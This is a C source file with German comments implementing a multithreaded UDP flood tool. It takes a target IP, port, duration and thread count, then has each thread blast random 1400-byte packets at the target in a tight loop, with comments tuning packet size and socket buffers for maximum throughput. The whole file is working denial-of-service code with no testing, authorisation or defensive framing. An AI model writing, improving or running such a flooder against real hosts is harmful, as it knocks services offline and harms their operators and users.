#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <errno.h>

// Struktur für die Thread-Argumente
struct thread_data {
    struct sockaddr_in target_addr;
    int duration;
};

// Zufälligen Payload generieren
void payload_rand(char *data, int size) {
    for (int i = 0; i < size; i++) {
        data[i] = (char)((rand() % 94) + 32); // Druckbare ASCII-Zeichen für bessere Stabilität
    }
}

// Die eigentliche Sende-Schleife für jeden Thread
void *send_packets(void *arg) {
    struct thread_data *t_data = (struct thread_data *)arg;
    
    int sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        pthread_exit(NULL);
    }

    // Performance-Optimierung: Socket-Puffer vergrößern
    int buffer_size = 1024 * 1024; // 1MB
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));

    char data[1400]; // 1400 Bytes ist optimal (bleibt unter der typischen MTU von 1500, verhindert Paket-Fragmentierung)
    payload_rand(data, sizeof(data));

    time_t start_time = time(NULL);

    while (time(NULL) - start_time < t_data->duration) {
        ssize_t sent = sendto(sock, data, sizeof(data), 0, (struct sockaddr *)&t_data->target_addr, sizeof(t_data->target_addr));
        
        // Falls der lokale Netzwerk-Puffer voll ist, kurz warten statt abzustürzen
        if (sent < 0 && (errno == ENOBUFS || errno == EAGAIN || errno == EWOULDBLOCK)) {
            usleep(10); 
        }
    }

    close(sock);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    // Standardmäßig nutzen wir 4 Threads, wenn nichts angegeben ist
    if (argc < 4 || argc > 5) {
        printf("\033[1;31mUsage: %s <IP> <Port> <Time> [Threads]\033[0m\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = (argc == 5) ? atoi(argv[4]) : 4; // Nutzt 4 Threads, wenn kein Argument übergeben wurde

    srand(time(NULL));

    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);

    // Daten für die Threads vorbereiten
    struct thread_data t_data;
    t_data.target_addr = server_addr;
    t_data.duration = duration;

    pthread_t threads[num_threads];
    
    printf("\033[1;34m[+]\033[0m Sende Pakete an \033[1;33m%s:%d\033[0m für \033[1;32m%d Sekunden\033[0m mit \033[1;36m%d Threads\033[0m...\n", 
           target_ip, target_port, duration, num_threads);

    // Threads starten
    for (int i = 0; i < num_threads; i++) {
        if (pthread_create(&threads[i], NULL, send_packets, (void *)&t_data) != 0) {
            perror("Thread-Fehler");
            return 1;
        }
    }

    // Warten bis alle Threads fertig sind
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\033[1;32m[+] Fertig!\033[0m\n");
    return 0;
}
